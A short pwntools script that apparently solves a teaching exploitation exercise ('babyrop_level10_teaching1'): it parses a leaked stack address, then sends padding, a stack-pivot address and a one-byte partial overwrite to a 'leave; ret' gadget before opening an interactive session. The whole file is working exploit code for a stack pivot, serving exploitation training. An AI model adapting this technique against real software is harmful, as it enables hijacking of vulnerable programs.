#!/usr/bin/env python3

from pwn import *

FILENAME='/babyrop_level10_teaching1'

# Create a process
p = process(FILENAME)
#p = process(["strace", "-o", "trace.out", FILENAME])

# Create an ELF and a ROP object
context.binary = elf = ELF(FILENAME)
rop = ROP(elf)

# Read the address of input buffer
p.recvuntil(b'[LEAK] Your input buffer is located at: 0x')
input_buffer_address = int(p.recv(12), 16)
log.info('Address of input buffer: ' + hex(input_buffer_address))

# padding
rop.raw('a' * 40)

# Address for stack pivoting
rop.raw(input_buffer_address - 0x10)

#leave; ret gadget in main function
rop.raw(p8(0x61))
#print(rop.dump())
#print(hexdump(bytes(rop)))

# Send input
p.send(rop.chain())
p.interactive()